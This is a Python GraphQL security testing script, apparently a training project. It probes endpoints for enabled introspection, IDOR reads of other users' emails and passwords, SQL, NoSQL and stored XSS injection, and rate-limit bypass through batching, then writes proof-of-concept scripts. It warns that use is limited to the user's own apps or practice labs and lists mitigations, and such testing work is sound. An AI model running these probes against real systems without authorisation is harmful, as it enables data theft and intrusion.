#!/usr/bin/env python3
"""
GraphQL API Security Testing Toolkit
Project #36: GraphQL Security Assessment

LEGAL: Only test your own apps, OWASP Juice Shop, or PortSwigger labs.
"""

import sys
import os
import re
import json
import time
import argparse
import datetime
import urllib3
from urllib.parse import urljoin

import requests

from graphql_payloads import (
    COMMON_ENDPOINTS, INTROSPECTION_QUERY, SIMPLE_INTROSPECTION,
    SQLI_PAYLOADS, NOSQLI_PAYLOADS, XSS_PAYLOADS,
    IDOR_QUERIES, build_alias_batch, build_array_batch,
    build_fragment_query, SUCCESS_SIGNATURES,
    python_poc, curl_poc, score,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

class GraphQLToolkit:
    def __init__(self, target, timeout=10, delay=0.3,
                 output_dir='.', verbose=False, cookie=None):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        self.base = target.rstrip('/')
        self.timeout = timeout
        self.delay = delay
        self.output_dir = output_dir
        self.verbose = verbose

        os.makedirs(f"{output_dir}/graphql_pocs", exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 GraphQL Toolkit',
            'Content-Type': 'application/json',
        })
        if cookie:
            self.session.headers['Cookie'] = cookie

        self.results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'endpoint': None,
            'vulnerable': False,
            'schema': {},
            'findings': [],
            'pocs': [],
            'error': None,
        }

    def _gql(self, query, endpoint=None):
        """Send a GraphQL query."""
        time.sleep(self.delay)
        url = endpoint or self.results['endpoint'] or (self.base + '/graphql')
        try:
            r = self.session.post(url, json={'query': query},
                                  timeout=self.timeout, verify=False)
            return r
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] {str(e)[:60]}{Colors.RESET}")
            return None

    def _gql_raw(self, payload, endpoint=None):
        """Send raw JSON (for array batching)."""
        time.sleep(self.delay)
        url = endpoint or self.results['endpoint'] or (self.base + '/graphql')
        try:
            return self.session.post(url, json=payload,
                                     timeout=self.timeout, verify=False)
        except Exception as e:
            return None

    # ------------------------------------------------------------------ #
    def phase1_discovery(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: ENDPOINT DISCOVERY{Colors.RESET}")
        print(f"    Testing {len(COMMON_ENDPOINTS)} common paths...")

        for path in COMMON_ENDPOINTS:
            url = urljoin(self.base, path)
            try:
                r = self.session.get(url, timeout=self.timeout, verify=False)
                # GraphQL endpoints often return 200 with empty data, or 400 with method error
                is_gql = False
                if r.status_code == 200:
                    if 'graphql' in r.text.lower() or 'query' in r.text.lower():
                        is_gql = True
                elif r.status_code in (400, 405):
                    # Try a POST with intro
                    rr = self._gql_raw({'query': '{__typename}'}, endpoint=url)
                    if rr and rr.status_code == 200 and '__typename' in rr.text:
                        is_gql = True

                if is_gql:
                    print(f"      {Colors.GREEN}[+]{Colors.RESET} {path} — GraphQL endpoint!")
                    self.results['endpoint'] = url
                    self.results['vulnerable'] = True
                    break
                else:
                    if self.verbose:
                        print(f"      {Colors.YELLOW}[-]{Colors.RESET} {path} ({r.status_code})")
            except Exception:
                continue

        if self.results['endpoint']:
            print(f"\n    {Colors.GREEN}[✓] Endpoint: {self.results['endpoint']}{Colors.RESET}")
        else:
            print(f"\n    {Colors.RED}[✗] No GraphQL endpoint found{Colors.RESET}")

    # ------------------------------------------------------------------ #
    def phase2_introspection(self):
        if not self.results['endpoint']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: INTROSPECTION{Colors.RESET}")

        r = self._gql(SIMPLE_INTROSPECTION)
        if r and '__schema' in r.text:
            print(f"      {Colors.RED}[+]{Colors.RESET} INTROSPECTION ENABLED!")
            self.results['findings'].append({
                'type': 'introspection_enabled',
                'severity': score('introspection_enabled'),
                'detail': 'Introspection query returned schema',
            })

            # Full introspection
            r2 = self._gql(INTROSPECTION_QUERY)
            if r2 and r2.status_code == 200:
                try:
                    data = r2.json().get('data', {})
                    schema = data.get('__schema', {})
                    types = schema.get('types', [])
                    self.results['schema'] = {
                        'type_count': len(types),
                        'type_names': [t['name'] for t in types if not t['name'].startswith('__')][:30],
                    }
                    print(f"      Types found: {len(types)}")
                    for tname in self.results['schema']['type_names'][:10]:
                        print(f"        - {tname}")

                    # Extract queries and mutations
                    q_type = schema.get('queryType', {})
                    if q_type:
                        print(f"      Query type: {q_type.get('name')}")
                    m_type = schema.get('mutationType', {})
                    if m_type:
                        print(f"      Mutation type: {m_type.get('name')}")
                except Exception as e:
                    print(f"      {Colors.YELLOW}[~] Parse error: {str(e)[:60]}{Colors.RESET}")
        else:
            print(f"      {Colors.GREEN}[✓]{Colors.RESET} Introspection disabled")

    # ------------------------------------------------------------------ #
    def phase3_idor(self):
        if not self.results['endpoint']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: IDOR / UNAUTH ACCESS{Colors.RESET}")

        # Try reading user 2 (not us)
        r = self._gql('{ user(id: 2) { id username email role } }')
        if r and r.status_code == 200 and 'alice' in r.text.lower():
            print(f"      {Colors.RED}[+]{Colors.RESET} IDOR: user 2's data leaked!")
            print(f"        Response: {r.text[:150]}")
            self.results['findings'].append({
                'type': 'idor_direct',
                'severity': score('idor_direct'),
                'detail': 'Read user 2 without auth',
                'response': r.text[:500],
            })
            self.results['vulnerable'] = True

        # Try all users
        r = self._gql('{ users { id username email password } }')
        if r and r.status_code == 200 and ('@example.com' in r.text):
            print(f"      {Colors.RED}[+]{Colors.RESET} ALL USERS EXPOSED!")
            print(f"        Preview: {r.text[:200]}")
            self.results['findings'].append({
                'type': 'all_users_exposed',
                'severity': score('all_users_exposed'),
                'detail': 'All users returned with emails',
                'response': r.text[:1000],
            })
            self.results['vulnerable'] = True

        # Try nested IDOR
        r = self._gql('{ user(id: 1) { username posts { id title author { email } } } }')
        if r and r.status_code == 200 and '@example.com' in r.text:
            print(f"      {Colors.RED}[+]{Colors.RESET} NESTED IDOR: emails via posts!")
            self.results['findings'].append({
                'type': 'idor_nested',
                'severity': score('idor_nested'),
                'detail': 'Nested data extraction working',
            })
            self.results['vulnerable'] = True

    # ------------------------------------------------------------------ #
    def phase4_injection(self):
        if not self.results['endpoint']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: INJECTION TESTING{Colors.RESET}")

        # SQLi
        for p in SQLI_PAYLOADS:
            q = '{ user(id: "' + p['value'] + '") { username } }'
            r = self._gql(q)
            if r and r.status_code == 200 and ('syntax' in r.text.lower() or 'error' in r.text.lower()):
                print(f"      {Colors.RED}[+]{Colors.RESET} [{p['name']}] SQL error reflected")
                self.results['findings'].append({
                    'type': 'sqli',
                    'severity': score('sqli'),
                    'payload': p['value'],
                    'detail': 'SQL error in response',
                })

        # NoSQLi
        for p in NOSQLI_PAYLOADS:
            q = '{ user(id: ' + p['value'] + ') { username } }'
            r = self._gql(q)
            if r and r.status_code == 200 and '@example.com' in r.text:
                print(f"      {Colors.RED}[+]{Colors.RESET} [{p['name']}] NoSQLi accepted")
                self.results['findings'].append({
                    'type': 'nosqli',
                    'severity': score('nosqli'),
                    'payload': p['value'],
                })

        # XSS (stored via mutation)
        for p in XSS_PAYLOADS:
            q = ('mutation { createPost(title: "x", content: "' +
                 p['value'].replace('"', '\\"') +
                 '", authorId: 1) { id content } }')
            r = self._gql(q)
            if r and r.status_code == 200 and ('script' in r.text or 'onerror' in r.text):
                print(f"      {Colors.RED}[+]{Colors.RESET} [{p['name']}] XSS stored")
                self.results['findings'].append({
                    'type': 'xss',
                    'severity': score('xss'),
                    'payload': p['value'],
                })

    # ------------------------------------------------------------------ #
    def phase5_rate_limit(self):
        if not self.results['endpoint']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 5: RATE LIMIT BYPASS{Colors.RESET}")

        # Alias batching — 100 users in 1 request
        aliases = build_alias_batch([1] * 100, field='username')
        r = self._gql(aliases)
        if r and r.status_code == 200 and 'u0' in r.text:
            print(f"      {Colors.RED}[+]{Colors.RESET} ALIAS BATCHING: 100 queries in 1 request")
            self.results['findings'].append({
                'type': 'rate_limit_bypass',
                'severity': score('rate_limit_bypass'),
                'detail': 'Alias batching accepted',
            })
            self.results['vulnerable'] = True

        # Array batching
        arr = build_array_batch('{ user(id: 1) { username } }', 20)
        r = self._gql_raw(arr)
        if r and r.status_code == 200:
            try:
                resp_json = r.json()
                if isinstance(resp_json, list) and len(resp_json) > 1:
                    print(f"      {Colors.RED}[+]{Colors.RESET} ARRAY BATCHING: 20 queries accepted")
                    self.results['findings'].append({
                        'type': 'array_batching',
                        'severity': score('rate_limit_bypass'),
                        'detail': f'{len(resp_json)} queries in one request',
                    })
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    def phase6_pocs(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 6: POC GENERATION{Colors.RESET}")

        # Generate IDOR PoC
        idor_q = '{ user(id: 2) { id username email password } }'
        py = python_poc(self.results['endpoint'], idor_q, 'IDOR - read user 2')
        py_path = f"{self.output_dir}/graphql_pocs/poc_idor_user2.py"
        with open(py_path, 'w') as f:
            f.write(py)
        os.chmod(py_path, 0o755)

        sh = curl_poc(self.results['endpoint'], idor_q)
        sh_path = f"{self.output_dir}/graphql_pocs/poc_idor_user2.sh"
        with open(sh_path, 'w') as f:
            f.write(sh)
        os.chmod(sh_path, 0o755)

        print(f"      {Colors.GREEN}✓{Colors.RESET} poc_idor_user2.py")
        print(f"      {Colors.GREEN}✓{Colors.RESET} poc_idor_user2.sh")

        # Introspection PoC
        py = python_poc(self.results['endpoint'], INTROSPECTION_QUERY, 'Introspection dump')
        py_path = f"{self.output_dir}/graphql_pocs/poc_introspection.py"
        with open(py_path, 'w') as f:
            f.write(py)
        os.chmod(py_path, 0o755)

        print(f"      {Colors.GREEN}✓{Colors.RESET} poc_introspection.py")

        self.results['pocs'].append({
            'name': 'idor_user2', 'path': py_path,
        })

    # ------------------------------------------------------------------ #
    def save_reports(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = f"{self.output_dir}/graphql_report_{ts}.json"
        with open(json_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[✓] JSON report: {json_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Endpoint:        {self.results['endpoint']}")
        print(f"    Findings:        {len(self.results['findings'])}")
        print(f"    PoCs generated:  {len(self.results['pocs'])}")
        if self.results['schema']:
            print(f"    Schema types:    {self.results['schema'].get('type_count', 0)}")

        sev_color = Colors.RED if self.results['vulnerable'] else Colors.GREEN
        sev = 'HIGH to CRITICAL' if self.results['vulnerable'] else 'LOW'
        print(f"    Severity:        {sev_color}{sev}{Colors.RESET}")

        if self.results['findings']:
            print(f"\n    {Colors.RED}Findings:{Colors.RESET}")
            for f in self.results['findings']:
                print(f"        - [{f['severity']}] {f['type']}: {f.get('detail', '')[:60]}")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. Disable introspection in production")
        print(f"        2. Query depth limiting")
        print(f"        3. Query complexity analysis")
        print(f"        4. Rate limiting (per query, not per request)")
        print(f"        5. Input validation (GraphQL types)")
        print(f"        6. Field-level authorization")
        print(f"        7. Avoid sensitive fields in schema")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}GraphQL Security Testing Toolkit{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}Target: {self.base}{Colors.RESET}")

        self.phase1_discovery()
        self.phase2_introspection()
        self.phase3_idor()
        self.phase4_injection()
        self.phase5_rate_limit()
        self.phase6_pocs()

        self.print_summary()
        self.save_reports()

def main():
    p = argparse.ArgumentParser(
        description="GraphQL Security Testing Toolkit (Project #36)",
    )
    p.add_argument('url', help='Target base URL (e.g. http://localhost:5000)')
    p.add_argument('--cookie', help='Cookie header')
    p.add_argument('--timeout', type=int, default=10)
    p.add_argument('--delay', type=float, default=0.3)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  GRAPHQL SECURITY ASSESSMENT")
    print("  Project #36: GraphQL API Security Testing")
    print("=" * 70)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Legal: Only test your own apps, OWASP Juice Shop, or PortSwigger labs.{Colors.RESET}\n")

    toolkit = GraphQLToolkit(
        target=args.url,
        timeout=args.timeout,
        delay=args.delay,
        output_dir=args.output,
        verbose=args.verbose,
        cookie=args.cookie,
    )
    toolkit.run()

if __name__ == '__main__':
    main()